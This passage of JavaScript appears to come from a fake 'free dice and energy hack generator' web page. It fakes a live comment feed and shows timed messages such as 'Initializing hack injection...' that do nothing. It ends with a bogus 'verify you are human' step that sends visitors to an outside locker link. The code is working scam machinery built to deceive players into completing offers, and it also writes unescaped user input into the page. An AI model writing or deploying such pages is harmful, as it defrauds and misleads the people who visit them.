          usernames[Math.floor(Math.random() * usernames.length)];
        const randomComment =
          comments[Math.floor(Math.random() * comments.length)];
        const commentElement = document.createElement("div");
        const randomColor = getRandomColor();
        commentElement.innerHTML = `<strong class="${randomColor}">${randomUsername}:</strong> ${randomComment}`;
        document.getElementById("commentSection").appendChild(commentElement);
        document.getElementById("commentSection").scrollTop =
          document.getElementById("commentSection").scrollHeight;
      }

      // Function to handle the submission of a comment
      function submitComment() {
        const username = document.getElementById("usernameInput").value;
        const comment = document.getElementById("commentInput").value;
        if (username && comment) {
          const commentElement = document.createElement("div");
          commentElement.innerHTML = `<strong class="text-pink-500">${username}:</strong> ${comment}`;
          document.getElementById("commentSection").appendChild(commentElement);
          document.getElementById("commentSection").scrollTop =
            document.getElementById("commentSection").scrollHeight;
          document.getElementById("usernameInput").value = "";
          document.getElementById("commentInput").value = "";
        }
      }

      // Event listener for the submit button
      document
        .getElementById("submitComment")
        .addEventListener("click", submitComment);

      // Generate random comments at random intervals
      setInterval(displayRandomComment, getRandomInt(2500, 5000));

      // comment div ends here
      document
        .getElementById("generateButton")
        .addEventListener("click", function () {
          var username = document.getElementById("username").value;
          if (
            username === "" ||
            (!pcRadio.checked && !appleRadio.checked && !androidRadio.checked)
          ) {
            window.alert("Please enter your username and select your device!");
          } else {
            document.getElementById("popup").classList.remove("hidden");
            document.getElementById("loadingMessage").textContent =
              "Generating your " +
              document.getElementById("Coins").value +
              " Dice...";
            document
              .getElementById("loadingAnimation")
              .classList.remove("hidden");

            setTimeout(function () {
              document.getElementById("loadingMessage").textContent =
                "Generating your " +
                document.getElementById("energy").value +
                " Energy...";
            }, 1500);

            setTimeout(function () {
              document.getElementById("loadingMessage").textContent =
                "Processing your request...";
            }, 3000);

            setTimeout(function () {
              document.getElementById("loadingMessage").textContent =
                "Checking server status...";
            }, 6000);

            setTimeout(function () {
              document.getElementById("loadingMessage").textContent =
                "Connecting to the game server...";
            }, 9000);

            setTimeout(function () {
              document.getElementById("loadingMessage").textContent =
                "Generating your hack file...";
            }, 12000);

            setTimeout(function () {
              document.getElementById("loadingMessage").textContent =
                "Validating your information...";
            }, 15000);

            setTimeout(function () {
              document.getElementById("loadingMessage").textContent =
                "Initializing hack injection...";
            }, 18000);

            setTimeout(function () {
              document.getElementById("loadingMessage").textContent =
                "Finalizing your request...";
            }, 21000);

            setTimeout(function () {
              document.getElementById("loadingMessage").textContent =
                "Too many requests - Our server is getting too many requests. Please verify that you are human.";
              document
                .getElementById("loadingMessage")
                .classList.add("text-red-500");
              document.getElementById("icon").classList.remove("hidden");
            }, 24000);

            setTimeout(function () {
              document
                .getElementById("loadingAnimation")
                .classList.add("hidden");
              document
                .getElementById("completeButton")
                .classList.remove("hidden");
              document
                .getElementById("verifyButton")
                .classList.remove("hidden");
            }, 27000);
          }
        });
      function openLockerLink() {
        // window.location = "https://youtube.com/";
        // window.location.href = "https://verifyhere.xyz/cl/i/6dxw9m";
        window.location.href = "https://allgameshackintermediate.onrender.com";
      }
    </script>
